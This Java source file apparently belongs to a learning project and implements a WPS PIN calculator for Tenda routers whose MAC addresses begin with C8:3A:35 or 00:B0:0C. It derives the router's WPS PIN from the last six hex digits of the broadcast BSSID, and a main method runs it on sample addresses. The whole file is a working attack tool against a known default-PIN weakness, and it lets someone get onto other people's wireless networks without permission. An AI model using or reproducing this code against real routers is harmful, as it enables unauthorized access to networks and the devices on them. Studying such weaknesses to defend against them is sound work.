package hh.learnj.testj.pin.code.tenda;

import hh.learnj.testj.pin.code.WpsPin;

import java.util.HashMap;
import java.util.Map;

import org.apache.log4j.Logger;

public class WpsPinTenda implements WpsPin {

	private static Logger logger = Logger.getLogger(WpsPinTenda.class);

	private String bssid = null;
	private String ssid = null;
	private String pin = null;

	public Map<String, Integer> map = new HashMap<String, Integer>();

	public WpsPinTenda() {
		map.put("0", 0);
		map.put("1", 1);
		map.put("2", 2);
		map.put("3", 3);
		map.put("4", 4);
		map.put("5", 5);
		map.put("6", 6);
		map.put("7", 7);
		map.put("8", 8);
		map.put("9", 9);
		map.put("A", 10);
		map.put("B", 11);
		map.put("C", 12);
		map.put("D", 13);
		map.put("E", 14);
		map.put("F", 15);
	}

	public String getMac() {
		return this.bssid;
	}

	@Override
	public void setBssid(String mac) {
		this.pin = null;
		this.bssid = mac;
	}

	@Override
	public String getRooterName() {
		return "[-] Tenda of mac starts with C8:3A:35 or 00:B0:0C for " + getSsid();
	}

	@Override
	public String getPinCode() {
		if (null == pin) {
			pin = calcPinCode();
		}
		return pin;
	}
	
	public boolean isTendaSpecial() {
		if (null == bssid) {
			return false;
		}
		bssid = bssid.toUpperCase();
		if ((bssid.length() == 17 && (bssid.startsWith("C8:3A:35") || 
				bssid.startsWith("00:B0:0C")))
				|| (bssid.length() == 12)
				&& (bssid.startsWith("C83A35") || bssid.startsWith("00B00C"))) {
			return true;
		}
		return false;
	}

	protected String calcPinCode() {
//		logger.info(getRooterName());
		String code = null;
		if (isTendaSpecial()) {
//			logger.debug("[-] Calculating BSSID => " + bssid);
			code = String.valueOf(wpsPinCodeBeginWithC83A35And00B00C(bssid));
//			logger.debug("[+] SSID [" + getSsid() + "] BSSID [" + bssid + "], WPS prefix pin code:" + code);
		} else {
			throw new IllegalArgumentException("Unable calculate MAC address.");
		}
		return code;
	}

	/**
	 * PIN码算法，解密涉及的MAC地址段，MAC地址前6位是C83A35或者00B00C的产品。
	 * 
	 * @param mac
	 * @return
	 */
	public Integer wpsPinCodeBeginWithC83A35And00B00C(String bssid) {
		String tmp = bssid.replaceAll(":", "");
		int len = tmp.length();
		tmp = tmp.substring(len - 6, len);
//		logger.debug("[+] SSID [" + getSsid() + "] BSSID [" + bssid + "], L6:" + tmp);
		Integer sum = 0;
		for (int i = 0; i < tmp.length(); i++) {
			sum += map.get(String.valueOf(tmp.charAt(i)))
					* ((int) Math.pow(16, tmp.length() - i - 1));
		}
		return sum;
	}
	
	public String getSsid() {
		if (null == ssid) {
			return "Unknow";
		}
		return ssid;
	}

	@Override
	public void setSsid(String ssid) {
		this.ssid = ssid;
	}
	
	public static void main(String [] args) {
		WpsPinTenda tenda = new WpsPinTenda();
		String BSSID = "C8:3A:35:09:2B:00";
		BSSID = "C8:3A:35:50:68:58";
		tenda.setBssid(BSSID);
		if (tenda.isTendaSpecial()) {
			logger.debug("[+][-] Found Tenda [-]" + BSSID + "[-] match pin code [-]" + tenda.getPinCode() + "[-]");
		}
	}

}
